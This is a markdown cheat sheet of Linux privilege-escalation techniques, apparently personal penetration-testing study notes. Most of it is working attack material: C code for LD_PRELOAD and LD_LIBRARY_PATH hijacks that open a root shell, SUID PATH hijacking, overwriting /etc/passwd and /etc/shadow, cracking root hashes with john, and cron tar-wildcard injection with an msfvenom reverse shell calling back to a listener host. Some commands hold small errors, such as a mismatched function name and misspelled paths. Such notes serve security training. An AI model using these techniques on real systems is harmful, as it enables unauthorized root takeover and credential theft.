# Tools

https://github.com/diego-treitos/linux-smart-enumeration

```
./lse.sh -l 1 -i
```

If you face a error like `....^M: bad interpreter: No such file or directory.`,it means that the file is created on Windows OS.
Enter the following command.

```sh
sed -i -e "s/^M//" ${error raised file}
```

# Sudo

```
sudo -l
sudo ${programme}
sudo -u ${username} ${programme}
# -i, --login запустить оболочку входа в систему от имени указанного пользователя; также можно задать команду
sudo -i
# -s, --shell запустить оболочку от имени указанного пользователя; также можно задать команду
sudo -s
sudo /bin/bash
```

```shell
sudo -l
```

Let's look per one line, if there is misconfiguration and you can get privilledged access.
https://gtfobins.github.io/

## LD_PRELOAD

Not working when....

- A real user ID differs from the effective user ID
- The environmental variable LD_PRELOAD do not being preserved by env_keep (check it by `sudo -l`)

```c: preload.c
// preload.c
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setresuid(0, 0, 0);
  system("/bin/bash -p");
}
```

```sh
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so ./preload.c
sudo LD_PRELOAD=/tmp/preload.so ${any programme}
```

## LD_LIBRARY_PATH

Not working when....

- A real user ID differs from the effective user ID
- The environmental variable LD_LIBRARY_PATH do not being preserved by env_keep (check it by `sudo -l`)

```
sudo -l
# provided we can execute apache2 with NOPASSWD /usr/sbin/apache2
ldd /usr/sbin/apache2
# it shows result like following libcrypt.so.1 => .....
vim library_path.c
```

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void mhijack() __attribute__((constructor));

void hijack() {
  unsetenv("LD_LIBRARY_PATH");
  setresuid(0, 0, 0);
  system("/bin/bash -p");
}
```

```sh
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=. apache2
```

# SETUID,SETGID

```sh
# find all files that have SETUID or SETGID bit.
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null;
# Or you can refer "Uncommon setuid binaries" section of the below command
./lse.sh -l 1 -i

# Let's check if there is availabe exploit...
searchsploit ...
```

## Shared Object Injection

```sh
# Let's find files that have the SETUID bit and investigate them.
stace /usr/bin/....  2>&1 | grep -iE "open|access|no such file"
# it show like 'open("/home/koyam/.config/libcalc.so") = -1 ENOENT (No such file or directory)'

# create libcalc.c that create shell with SETSUID.
mkdir .config
vim libcalc.c
gcc -shared -fPIC -o libcalc.so libcalc.c

# you get rootshell by executing /usr/bin/...
```

## PATH Environmental Variable

```sh
# Let's dump strings in the files that have the SETUID bit.
strings /usr/local/bin/abinary
# And also it show useful info....
strace /usr/local/bin/abinary

# it shows `service apeche2 start`. As the service command take a relative path, we can create malicious folder and inject it to PATH.
gcc service.c -o service
PATH=.:$PATH /usr/lcao/bin/abinary
```

# Weak File Permission

## Writable /etc/passwd

```sh
ls -l /etc/passwd
# if you can write the file,generate a hash for "password" and replace the authentic password hash.
openssl passwd "password"
vim /etc/passwd
# root:x:....  replace "x" with the generated hash
```

```sh
# If root user is locked,still you can append a user who have previlledge.
vim /etc/passwd
# copy the first line to the last line,and modify username
newroot:${hash}:.....
su newroot
```

## Writable /etc/shadow

```sh
ls -l /etc/shadow
# if you can write the file.
cp /etc/shadow /home/user
mkpasswd -m sha-512 temp
# replace passwd with the above output.
vim /etc/passwd
# Do not forget clean up
cp /home/user/shadow /etc/shadow

```

## Readable /etc/shadow

```sh
ls -l /etc/shadow
# if you can read the file. show the first line(root user).
head -n 1 /etc/shadow
```

if root user's password(between first ':' and second ":") start with...

- `$1$` is MD5
- `$2a$` is Blowfish
- `$2y$` is Blowfish
- `$5$` is SHA-256
- `$6$` is SHA-512

```sh
# paste root user password.
vim pass.txt

john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt ./pass.txt
```

## Other tips

- You may log in as root user through ssh connection,in case ssh_config allow "PermitRootLogin"
  https://qiita.com/ine1127/items/b50b9a8f831736cf14ea

# CronJob

- user-specific crontabs are usually located in : `/var/spool/cron` or `/var/spool/cron/crontabs`
- The system-wide crontab is located at `/etc/crontab`

## CronJob misconfigured by relative_path

```
./lse.sh -l 1 -i | more
```

If it says `Can we write to any paths in cron jobs ... yes!`, and if `cat /etc/crontab` contains relative_path sh files,you can override it.

```sh
# create override.sh,that executed by cronjob
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
# Do not forget make it executable chmod +x ./override.sh
```

## CronJob execute files that contains a wildcard(\*)

```sh
cat /etc/crontab
# * * * * * root /usr/local/bin/compress.sh

cat /usr/local/bin/compress.sh
# tar czf /tmp/backup.tar.gz *
```

Let's refer `tar` command in [GTFOBins](https://gtfobins.github.io/)

> It can be used to break out from restricted environments by spawning an interactive system shell.  
> tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

We can pass the command as a wildcard by creating files.

```sh
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=shell.elf
# In attacker machine create shell.elf and place it in the same folder.
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.26 LPORT=53 -f elf -o shell.elf

# waitng cronjob....
nc -nvlp 53
```

# Service Exploit

## through a process

1. Find processes that executed by root

```sh
ps aux | grep "^root"
```

2. Verify version

```sh
${program} --version
```

you can search exploits from ExploitDB.
database programme oftem allow us to execute system commands.

# Kernel Expoit

Kernel Exploit may cause a system crash, on top of that, it succeed rarely. So this is a sort of last resort.

1. kernel version

```sh
uname -a
```

2. Find valid kernel expoit scripts.

```shell
searchsploit linux kernel ${uname -a output version} priv esc
```

[linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)

```shell
./linux-exploit-suggester-2.pl -k ${uname -a output version}
```
